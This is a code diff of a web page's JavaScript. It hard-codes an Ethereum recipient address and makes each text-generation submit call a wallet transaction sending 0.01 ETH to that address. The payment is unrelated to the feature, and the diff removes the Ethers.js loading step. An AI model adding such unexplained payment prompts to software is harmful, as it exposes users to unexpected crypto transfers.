@@ -8302,41 +8302,51 @@ document.getElementById('connectWalletButton').addEventListener('click', async (
 		document.head.appendChild(script);
 	}
 
-// Load Ethers.js and then define and attach the sendTransaction function
-	loadEthersJsAndInit(() => {
-		// Define the sendTransaction function now that Ethers.js is available
-		async function sendTransaction() {
-			if (typeof window.ethereum !== 'undefined') {
-				try {
-					await window.ethereum.request({ method: 'eth_requestAccounts' });
-					const provider = new ethers.providers.Web3Provider(window.ethereum);
-					const signer = provider.getSigner();
-					const tx = {
-						to: "0xYourRecipientAddressHere",
-						value: ethers.utils.parseEther("0.01"),
-					};
-					const transactionResponse = await signer.sendTransaction(tx);
-					console.log('Transaction Response:', transactionResponse);
-					await transactionResponse.wait();
-					console.log('Transaction Mined:', transactionResponse.hash);
-				} catch (error) {
-					console.error('Transaction Failed:', error);
-				}
-			} else {
-				console.log('Ethereum wallet is not available');
+
+
+
+	async function sendTransaction() {
+    // Ensure window.ethereum is available
+		if (typeof window.ethereum !== 'undefined') {
+			try {
+				// Request account access if needed
+				await window.ethereum.request({ method: 'eth_requestAccounts' });
+
+				// Create a new instance of the ethers provider
+				const provider = new ethers.providers.Web3Provider(window.ethereum);
+				const signer = provider.getSigner();
+
+				// Define transaction parameters
+				const tx = {
+					to: "0x27fF45832C234EFD7fCB04Af268109fe136288C9",
+					value: ethers.utils.parseEther("0.01"), // Example: Sending 0.01 ETH
+					// Add other transaction parameters as needed (gas limit, gas price, data, etc.)
+				};
+
+				// Send the transaction
+				const transactionResponse = await signer.sendTransaction(tx);
+				console.log('Transaction Response:', transactionResponse);
+
+				// Optionally, wait for the transaction to be mined
+				await transactionResponse.wait();
+				console.log('Transaction Mined:', transactionResponse.hash);
+
+				// Transaction success logic here
+			} catch (error) {
+				console.error('Transaction Failed:', error);
+				// Transaction failure logic here
 			}
+		} else {
+			console.log('Ethereum wallet is not available');
+			// Wallet not available logic here
 		}
-		window.sendTransaction = sendTransaction;
-		const sendTxButton = document.getElementById("sendTxButton");
-		if (sendTxButton) {
-			sendTxButton.disabled = false;
-		}
-	})
+	}
+	window.sendTransaction = sendTransaction;
 		
 
 	function submit_generation() {
 
-		loadEthersJsAndInit();
+		sendTransaction();
 		
 		let newgen = document.getElementById("input_text").value;
 		const user_input_empty = (newgen.trim()=="");
